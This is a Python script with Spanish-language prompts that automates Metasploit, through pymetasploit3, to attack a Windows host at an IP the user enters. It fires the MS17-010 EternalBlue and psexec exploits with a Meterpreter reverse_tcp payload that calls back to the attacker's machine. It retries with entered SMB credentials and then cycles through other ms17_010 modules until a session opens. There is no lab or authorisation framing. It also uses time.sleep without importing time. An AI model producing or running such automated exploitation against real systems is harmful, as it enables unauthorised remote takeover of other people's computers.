import subprocess
import sys
from pymetasploit3.msfrpc import MsfRpcClient

def install_dependencies():
    try:
        import pymetasploit3
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pymetasploit3"])
        import pymetasploit3

def update_metasploit():
    subprocess.run(["msfupdate"])
    subprocess.run(["msfdb", "reinit"])

def get_user_input(prompt):
    return input(prompt)

def try_exploit(client, exploit_name, target_ip, local_ip, username=None, password=None):
    exploit = client.modules.use('exploit', exploit_name)
    exploit['RHOSTS'] = target_ip
    exploit['LHOST'] = local_ip
    if username and password:
        exploit['SMBUser'] = username
        exploit['SMBPass'] = password
    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
    payload['LHOST'] = local_ip
    exploit.execute(payload=payload)
    print("Esperando a que el exploit se complete...")
    # Aquí se debería implementar una mejor lógica de espera/verificación
    time.sleep(5)
    sessions = client.sessions.list
    if len(sessions) > 0:
        print("[+] Sesión creada, exploit fue exitoso!")
        return True
    print("[-] No se creó sesión con el exploit")
    return False

def main():
    install_dependencies()
    update_metasploit()

    client = MsfRpcClient('msf', port=55553)
    target_ip = get_user_input("Introduce la IP del objetivo: ")
    local_ip = get_user_input("Introduce tu IP local (LHOST): ")
    exploits = ['windows/smb/ms17_010_eternalblue', 'windows/smb/ms17_010_psexec']
    
    for exploit_name in exploits:
        if try_exploit(client, exploit_name, target_ip, local_ip):
            break
        else:
            print(f"El exploit {exploit_name} falló.")
            if exploit_name == 'windows/smb/ms17_010_psexec':
                print("Intentando con credenciales...")
                username = get_user_input("Introduce el nombre de usuario: ")
                password = get_user_input("Introduce la contraseña: ")
                if try_exploit(client, exploit_name, target_ip, local_ip, username, password):
                    break

    # Si todos los exploits fallan, prueba con otros de la base de datos
    else:
        print("Intentando con otros exploits disponibles...")
        for module in client.modules.exploits:
            if 'ms17_010' in module and module not in exploits:
                if try_exploit(client, module, target_ip, local_ip):
                    break

if __name__ == "__main__":
    main()
